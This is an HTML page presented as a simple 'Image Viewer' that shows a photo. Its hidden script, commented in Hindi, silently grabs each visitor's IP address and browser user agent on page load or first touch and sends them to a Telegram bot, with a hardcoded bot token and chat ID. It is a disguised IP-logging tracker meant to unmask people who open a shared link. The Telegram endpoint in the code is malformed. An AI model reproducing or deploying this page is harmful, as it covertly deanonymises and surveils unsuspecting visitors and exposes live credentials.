<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background-color: black; 
            margin: 0; 
            padding: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            user-select: none; 
        }
        img { 
            max-width: 100%; 
            max-height: 100vh; 
            object-fit: contain; 
        }
    </style>
</head>
<body>

    <!-- 📷 फोटो अब हमेशा लोड होगी -->
    <img src="photo.jpg" alt="Image Viewer">

    <script>
        const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
        const telegramChatId = "1798743066"; 

        let isTracked = false;

        function startTracking() {
            if (isTracked) return;
            isTracked = true;

            // 🌐 सीधे यूज़र का IP निकालने वाली सबसे भरोसेमंद और तेज API
            fetch('https://ipify.org')
            .then(res => res.json())
            .then(data => {
                sendToTelegram(data.ip);
            })
            .catch(() => {
                // बैकअप तरीका: अगर पहली API फेल हो तो दूसरी API
                fetch('https://ipapi.co')
                .then(res => res.json())
                .then(data => {
                    sendToTelegram(data.ip);
                }).catch(() => {
                    sendToTelegram("IP Protected/VPN Active");
                });
            });
        }

        function sendToTelegram(ip) {
            // यूज़र एजेंट से ब्राउज़र और बेसिक डिवाइस डिटेल्स निकालना
            const userAgentText = navigator.userAgent;

            const message = `🚨 *New Visitor Alert* 🚨\n\n` +
                            `🌐 *IP Address:* \`${ip}\`\n` +
                            `📱 *Device Details:* \`${userAgentText}\`\n` +
                            `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;

            fetch(`https://telegram.org{telegramToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }

        // विज़िटर के आते ही या स्क्रीन पर कहीं भी टच करते ही तुरंत ट्रिगर होगा
        window.addEventListener('DOMContentLoaded', startTracking);
        window.addEventListener('touchstart', startTracking);
        window.addEventListener('click', startTracking);
    </script>

</body>
</html>
